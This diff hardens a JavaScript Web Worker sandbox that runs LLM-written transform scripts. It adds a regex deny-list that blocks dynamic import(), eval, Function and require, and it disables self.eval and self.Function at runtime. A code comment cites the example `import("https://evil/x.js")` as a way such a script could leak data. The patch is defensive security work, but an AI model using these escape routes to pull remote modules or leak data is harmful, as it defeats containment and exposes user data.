@@ -453,11 +453,29 @@ const WORKER_PREAMBLE = [
   "if (self.navigator && self.navigator.sendBeacon) self.navigator.sendBeacon = () => { throw new Error('sendBeacon 已被沙箱禁用') }",
 ].join('\n')
 
+// 静态扫描禁用模式:动态 import() 是语法,Worker 运行时无法禁用(classic worker 支持 import() 拉外网 ES 模块),
+// 只能在入口静态拦截,防 LLM 脚本 `import("https://evil/x.js")` 外泄 transform 拿到的 data。
+// eval/Function/require 同列(动态执行可绕过静态扫描,双保险:运行时 workerCode 内 fn 创建后再禁 self.eval/self.Function)。
+const SANDBOX_FORBIDDEN_PATTERNS: { re: RegExp; msg: string }[] = [
+  { re: /\bimport\s*\(/, msg: '动态 import() 拉外网模块' },
+  { re: /\bimport\s+[\w'"]/, msg: 'import 语句' },
+  { re: /\beval\s*\(/, msg: 'eval() 动态执行' },
+  { re: /\bFunction\s*\(/, msg: 'Function() 构造' },
+  { re: /new\s+Function\b/, msg: 'new Function() 构造' },
+  { re: /\brequire\s*\(/, msg: 'require() 拉模块' },
+]
+
 export function runSandboxedScript(
   data: unknown,
   script: string,
   timeoutMs = 3000,
 ): Promise<EvalResult> {
+  // 入口静态扫描:拒绝含禁用模式的脚本(动态 import/eval/Function/require 防沙箱绕过与外泄)
+  for (const { re, msg } of SANDBOX_FORBIDDEN_PATTERNS) {
+    if (re.test(script)) {
+      return Promise.resolve({ ok: false, error: `沙箱拒绝执行:脚本含禁用模式(${msg})`, elapsedMs: 0 })
+    }
+  }
   return new Promise((resolve) => {
     const start = Date.now()
     let done = false
@@ -476,6 +494,7 @@ export function runSandboxedScript(
       '\nself.onmessage = async (e) => {\n' +
       '  try {\n' +
       '    const fn = new Function("data", e.data.script);\n' +
+      '    try { self.eval = undefined; self.Function = undefined; } catch {}\n' +
       '    let result = fn(e.data.data);\n' +
       '    if (result && typeof result.then === "function") result = await result;\n' +
       '    self.postMessage({ ok: true, result });\n' +
